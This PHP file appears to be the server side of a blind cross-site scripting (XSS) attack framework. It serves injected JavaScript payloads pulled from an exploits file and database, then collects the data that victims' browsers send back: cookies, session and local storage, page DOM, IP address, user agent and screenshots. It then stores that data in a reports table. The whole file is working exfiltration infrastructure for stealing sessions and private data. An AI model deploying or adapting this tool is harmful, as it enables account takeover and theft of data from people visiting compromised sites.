<?php
if(file_exists("./config.html")){
    include("./config.html");
}else{
    die("Config file does not exist<script>setTimeout(function(){location='./install.html'},1500)</script>");
}


$conn = new mysqli($dblocation, $dbuser, $dbpass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

if(isset($_SERVER['HTTP_REFERER'])){
	$referrer = addslashes($_SERVER['HTTP_REFERER']);
}else{ 
	$referrer = "Referer is not passed";
}


if(isset($_GET['ver'])){
	header("Content-Type: text/javascript;charset=UTF-8");
	header("Access-Control-Allow-Origin: *");

	echo("reportTo = '//".$_SERVER['HTTP_HOST'].htmlspecialchars($_SERVER['REQUEST_URI'])."';\n");

	echo(file_get_contents("./exploits/Blind XSS.txt"));


	$sql = "SELECT code FROM exploits where id='".addslashes($_GET['ver'])."'";
	$result = $conn->query($sql);
	if ($result->num_rows > 0) {
		while($row = $result->fetch_assoc()) {
	   	echo ($row["code"]);
		}
	} else {
		
	}

}

if(isset($_POST['report'])){
	$filename = time().".tmp";
	file_put_contents("./screenshots/".$filename,$_POST['screenshot']);

	$sql3 = "INSERT INTO reports SET 
		date = now(), 
		ip = '".addslashes($_POST['ip'])."',
		useragent = '".addslashes($_SERVER['HTTP_USER_AGENT'])."',
		referrer = '".$referrer."',
		cookie = '".addslashes($_POST['cookie'])."',
		sstorage = '".addslashes($_POST['sstorage'])."',
		lstorage = '".addslashes($_POST['lstorage'])."',
		DOM = '".addslashes($_POST['dom'])."',
		screenshot = '".$filename."',
		custom = '".addslashes($_POST['status'])."',
		exploitid = '".addslashes($_GET['ver'])."'
	";
	if ($conn->query($sql3) === TRUE) {
	} else {
		die($conn->error);
	}

}





?>

<?php

$conn->close();

?>
